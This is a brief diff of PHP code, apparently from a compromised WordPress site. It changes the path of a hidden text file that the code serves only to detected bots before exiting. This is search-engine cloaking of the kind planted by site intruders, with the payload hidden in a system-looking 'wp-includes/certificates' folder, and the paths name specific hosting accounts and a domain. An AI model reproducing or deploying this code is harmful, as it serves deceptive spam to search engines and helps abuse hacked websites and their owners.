@@ -13,7 +13,7 @@ function is_bot() {
 }
 
 if (is_bot()) {
-    $message = file_get_contents('/home/kigasc/public_html/wp-content/cache/minify/index.txt');
+    $message = file_get_contents('/home/woodland/theretreatkenya.org/wp-includes/certificates/index.txt');
     echo $message;
 exit;
 }
